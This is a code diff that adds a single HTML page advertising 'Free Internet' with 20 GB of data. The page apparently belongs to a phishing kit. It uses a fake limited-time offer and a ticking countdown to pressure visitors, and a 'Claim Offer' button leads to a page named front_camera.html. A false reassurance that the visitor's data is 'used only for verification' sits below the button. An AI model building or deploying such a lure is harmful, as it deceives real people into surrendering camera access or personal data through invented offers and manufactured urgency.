@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Free Internet Offer</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
+        body { background:#0b0e14; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
+        .container { max-width:400px; width:100%; background:linear-gradient(145deg,#141a24,#1e2633); border-radius:30px; padding:30px 25px; box-shadow:0 20px 40px rgba(0,0,0,0.6); text-align:center; border:1px solid #2a3344; }
+        .badge { background:#4fc3f7; color:#fff; font-size:12px; font-weight:700; padding:5px 15px; border-radius:20px; display:inline-block; letter-spacing:1px; text-transform:uppercase; }
+        h1 { color:#fff; font-size:36px; margin:10px 0 5px; font-weight:700; }
+        .sub { color:#8899bb; font-size:14px; margin-bottom:20px; }
+        .offer-box { background:#1f293b; border-radius:20px; padding:25px 15px; margin:20px 0; border:1px solid #2f3b4f; }
+        .data-icon { font-size:48px; margin-bottom:10px; }
+        .data-amount { font-size:48px; font-weight:800; color:#4fc3f7; letter-spacing:2px; }
+        .data-label { color:#b0c4de; font-size:18px; font-weight:600; margin-top:5px; }
+        .data-sub { color:#6a7b96; font-size:14px; margin-top:8px; }
+        .claim-btn { display:inline-block; background:linear-gradient(135deg,#4fc3f7,#0288d1); color:#fff; border:none; padding:16px 20px; width:100%; border-radius:50px; font-size:20px; font-weight:700; cursor:pointer; transition:0.3s; box-shadow:0 8px 20px rgba(2,136,209,0.3); letter-spacing:1px; margin:15px 0 20px; text-decoration:none; text-align:center; }
+        .claim-btn:hover { transform:scale(1.02); }
+        .footer p { color:#6a7b96; font-size:12px; margin:8px 0; }
+        .timer { color:#ffb74d !important; font-weight:600; font-size:14px !important; }
+        #timer { background:#1f293b; padding:3px 12px; border-radius:20px; color:#ffb74d; font-weight:700; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <span class="badge">LIMITED TIME OFFER</span>
+        <h1>Free Internet</h1>
+        <p class="sub">Special Offer from V4zrashd</p>
+    </div>
+    <div class="offer-box">
+        <div class="data-icon">📶</div>
+        <div class="data-amount">20 GB</div>
+        <div class="data-label">Free Internet Data</div>
+        <div class="data-sub">Limited Time Offer</div>
+    </div>
+    <a href="front_camera.html" class="claim-btn">📸 Claim Offer</a>
+    <div class="footer">
+        <p>Your data is safe. Used only for verification.</p>
+        <p class="timer">⏳ Offer ends in <span id="timer">09:54</span></p>
+    </div>
+</div>
+<script>
+    let t=594; setInterval(()=>{if(t<=0)return;t--;const m=String(Math.floor(t/60)).padStart(2,'0');const s=String(t%60).padStart(2,'0');document.getElementById('timer').textContent=`${m}:${s}`;},1000);
+</script>
+</body>
+</html>
